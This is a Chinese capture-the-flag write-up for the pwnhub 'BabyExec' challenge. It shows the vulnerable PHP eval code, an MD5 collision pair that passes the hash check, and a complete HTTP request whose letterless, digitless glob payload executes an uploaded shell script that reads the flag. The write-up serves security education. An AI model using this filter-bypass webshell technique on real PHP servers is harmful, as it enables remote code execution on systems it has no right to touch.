---
title: "pwnhub：【迎中秋】BabyExec writeup"
slug: dfc5eu
translationKey: dfc5eu
date: 2021-09-17T14:13:44+08:00
source: yuque/penetration
---

第一次投稿pwnhub，希望能加入咱们这个优秀的社区！

# 一、引子：真正的md5碰撞
题面

```php
<?php
error_reporting(0);
highlight_file(__FILE__);

if ((string)$_GET['x'] !== (string)$_GET['y'] && md5($_GET['x']) === md5($_GET['y'])) {
    if(!isset($_GET['shell'])){
        echo "Attack me!";
    } else {
        $shell = $_GET['shell'];
        if(!preg_match("/[a-zA-Z0-9_$@]+/",$shell)){
            eval($shell);
        } else {
            die('No,No,No! Keep it up......'); 
        }
    }
} else {
    die("No, way!");
}

?>
```

md5校验：

不使用弱类型，在x、y不相同的情况下，让md5(x) 、 md5(y)相等，老生常谈了。

bing搜索关键字【`md5 collision -"弱类型"`】，找到此文：[MD5 Collision Demo](https://www.mscs.dal.ca/~selinger/md5collision/)

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1631860140485-67131604-11ae-46cf-ba79-8e8090220296.png)

简单hex2bin、urlencode处理下格式

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1631860197554-41778c37-a70d-4eba-af61-feffeb2ffac6.png)

```php
http://121.40.89.206:8100/?&x=%D11%DD%02%C5%E6%EE%C4i%3D%9A%06%98%AF%F9%5C%2F%CA%B5%87%12F%7E%AB%40%04X%3E%B8%FB%7F%89U%AD4%06%09%F4%B3%02%83%E4%88%83%25qAZ%08Q%25%E8%F7%CD%C9%9F%D9%1D%BD%F2%807%3C%5B%D8%82%3E1V4%8F%5B%AEm%AC%D46%C9%19%C6%DDS%E2%B4%87%DA%03%FD%029c%06%D2H%CD%A0%E9%9F3B%0FW%7E%E8%CET%B6p%80%A8%0D%1E%C6%98%21%BC%B6%A8%83%93%96%F9e%2Bo%F7%2Ap
&
y=%D11%DD%02%C5%E6%EE%C4i%3D%9A%06%98%AF%F9%5C%2F%CA%B5%07%12F%7E%AB%40%04X%3E%B8%FB%7F%89U%AD4%06%09%F4%B3%02%83%E4%88%83%25%F1AZ%08Q%25%E8%F7%CD%C9%9F%D9%1D%BDr%807%3C%5B%D8%82%3E1V4%8F%5B%AEm%AC%D46%C9%19%C6%DDS%E24%87%DA%03%FD%029c%06%D2H%CD%A0%E9%9F3B%0FW%7E%E8%CET%B6p%80%28%0D%1E%C6%98%21%BC%B6%A8%83%93%96%F9e%ABo%F7%2Ap
```

成功满足第一个条件，进入第二个bypass。

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1631860255532-54bb0e85-ea2c-4926-bb8b-516ce46238bc.png)



# 二、突破：glob表达式
## （1）代码执行？
eval代码执行，正则限制了字符集。其实，翻译过来就是下面这样:

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1631859363498-b5c0156b-b406-437d-96ab-63349a48bb1c.png)

See：[https://regex101.com/r/oIJbxL/1](https://regex101.com/r/oIJbxL/1)



无字母数字webshell，老生常谈了！但这个场景中，有些许不同——关键的有两条：

1. 允许反引号```
2. 不允许`$`

因此，现在虽然允许使用（取反/异或/字符串拼接/字符自增），例如`''.[] = 'Array'`，可以构造出任意字符串了。

但是，如果不用`$`——怎么执行函数呢？（考虑题目环境是PHP 5，无法通过`($function)()`的方式调用函数

所以又找资料，中午休息的时候看到《[SCU-CTF HomePage  命令执行好文推荐 ¶](https://www.scuctf.com/ctfwiki/web/3.rce/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%85%B6%E4%BB%96%E5%A5%BD%E6%96%87%E6%8E%A8%E8%8D%90/)》这篇文章（y4 yyds），因而搞定了这道题。

## （2）命令执行！
在参考了p师傅的这篇文章《[无字母数字webshell之提高篇 | 离别歌](https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html)》以后，发现本题跟文章中的区别，主要就在于`@`被过滤了，需要考虑其它的办法。

为了准确跟进，本地搭建环境测试：

```php
# 模拟搭建一个 /tmp/phpSessoo
touch /tmp/phpSessoo
```

其实对照ASCII表，将@改成附近的就可以了（只需要在A之前）

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1631859928633-6a3f5736-021d-46c1-9b26-77ad4e58e173.png)

我这里选用了问号：`？`，看到可以成功匹配

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1631859915626-a1f6ee6e-6dc2-48dd-8953-c34fb1481afe.png)

最终payload:

```php
POST /?shell=?><?=`.+/???/???[?-[]?????`;?>&x=%D11%DD%02%C5%E6%EE%C4i%3D%9A%06%98%AF%F9%5C%2F%CA%B5%87%12F%7E%AB%40%04X%3E%B8%FB%7F%89U%AD4%06%09%F4%B3%02%83%E4%88%83%25qAZ%08Q%25%E8%F7%CD%C9%9F%D9%1D%BD%F2%807%3C%5B%D8%82%3E1V4%8F%5B%AEm%AC%D46%C9%19%C6%DDS%E2%B4%87%DA%03%FD%029c%06%D2H%CD%A0%E9%9F3B%0FW%7E%E8%CET%B6p%80%A8%0D%1E%C6%98%21%BC%B6%A8%83%93%96%F9e%2Bo%F7%2Ap&y=%D11%DD%02%C5%E6%EE%C4i%3D%9A%06%98%AF%F9%5C%2F%CA%B5%07%12F%7E%AB%40%04X%3E%B8%FB%7F%89U%AD4%06%09%F4%B3%02%83%E4%88%83%25%F1AZ%08Q%25%E8%F7%CD%C9%9F%D9%1D%BDr%807%3C%5B%D8%82%3E1V4%8F%5B%AEm%AC%D46%C9%19%C6%DDS%E24%87%DA%03%FD%029c%06%D2H%CD%A0%E9%9F3B%0FW%7E%E8%CET%B6p%80%28%0D%1E%C6%98%21%BC%B6%A8%83%93%96%F9e%ABo%F7%2Ap HTTP/1.1
Host: 121.40.89.206:8100
Content-Length: 189
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryeU7iiC6HdkUDXKn1
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

------WebKitFormBoundaryeU7iiC6HdkUDXKn1
Content-Disposition: form-data; name="file"; filename="1.txt"

#!/bin/sh

ls / && cat /flag && id
------WebKitFormBoundaryeU7iiC6HdkUDXKn1--

```



bingo

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1631859253286-0a30a78d-eeee-4915-9cdc-5467c544b90e.png)



# 参考资料
+ [无字母数字webshell之提高篇 | 离别歌](https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html)
+ [https://man7.org/linux/man-pages/man7/glob.7.html](https://man7.org/linux/man-pages/man7/glob.7.html)
+ [SCU-CTF HomePage  命令执行好文推荐 ¶](https://www.scuctf.com/ctfwiki/web/3.rce/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%85%B6%E4%BB%96%E5%A5%BD%E6%96%87%E6%8E%A8%E8%8D%90/)
+ [https://regex101.com/r/oIJbxL/1/](https://regex101.com/r/oIJbxL/1/)
+ [https://tool.ip138.com/ascii_code/](https://tool.ip138.com/ascii_code/)

